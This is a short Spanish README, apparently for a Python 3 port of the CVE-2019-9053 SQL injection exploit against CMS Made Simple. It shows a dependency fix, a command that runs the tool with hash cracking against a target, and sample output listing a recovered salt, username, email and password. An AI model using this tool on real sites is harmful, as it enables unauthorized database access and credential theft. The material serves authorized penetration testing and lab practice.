# CMS Made Simple < 2.2.10 - SQL Injection (el exploit ha sido parcheado para ser compatible con Python 3.)

<h1> CVE-2019-9053
  <h2>Fuente de exploración original: https://www.exploit-db.com/exploits/46635
<h1> Posible error y su corrección. </h1>

<bash>Traceback (most recent call last):
  File "46635.py", line 12, in <module>
    from termcolor import colored
ImportError: No module named termcolor
  
<h2> Corrección
  
  <code> pip install termcolor
  </code>

  <h2> Ejemplo de comando </h2>
  
  <code> python cve.py -u http://target --crack -w /usr/share/wordlists/ejemplo.txt   
 </code>
  
  <h1> Ejemplo del Resultado:
	  
```
  [+] Salt for password found: 18
  [+] Username found: mitw
  [+] Email found: adk
  [+] Password found: 0c01f4468d
```                                 

# Los usuarios asumen toda la responsabilidad por cualquier acción realizada con esta herramienta..</p>
# Si estos términos no son aceptables para usted, no utilice esta herramienta.
# Utilice esta herramienta solo en entornos donde se le permita realizar actividades de pruebas de penetración..
# No utilice esta herramienta con fines maliciosos.

